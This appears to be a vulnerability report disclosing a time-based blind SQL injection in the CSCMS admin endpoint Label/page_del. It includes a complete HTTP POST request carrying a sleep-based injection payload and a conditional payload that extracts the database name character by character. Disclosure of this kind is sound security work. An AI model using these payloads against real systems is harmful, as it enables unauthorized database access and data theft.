| Details there is a Injection vulnerability exists in sys\_Label.php\_page\_del  [image](https://user-images.githubusercontent.com/96719328/164129074-e744a273-b977-4f11-8832-6845e4df575c.png)  ``` POST /admin.php/Label/page_del HTTP/1.1 Host: cscms.test Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://cscms.test/admin.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: cscms_session=3lvkrqraebntvbg76ecdifg0j6vl1bpl; cscms_admin_id=3HtLFUmqgin4; cscms_admin_login=6hHRwKPiGz1%2FN9C4hmVHcOkF4oyCoI8lNzjjyeMF3fURy57grmVzbA;XDEBUG_SESSION=PHPSTORM Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 20  id[]='or+(sleep(5))#  ```  [image](https://user-images.githubusercontent.com/96719328/164129282-a8474ddd-309a-4eb2-a338-527f498862d8.png)  You can see that success makes the server sleep Construct payload to guess the database  `(case(1)when(ascii(substr((select(database()))from(1)for(1)))=99)then(sleep(5))else(1)end)`  [image](https://user-images.githubusercontent.com/96719328/164129298-d2f2b78f-f0fd-4e51-a9e3-7890b07452b7.png)  [image](https://user-images.githubusercontent.com/96719328/164129312-0ec8baa0-684e-4cce-942a-314e6efafaa0.png)  There is blind SQL injection. Because the database name is "cscms", the string returned by select database() starts with 'C', substr ((select + database()), 1,1) = 'C' is true, and the verification is correct |
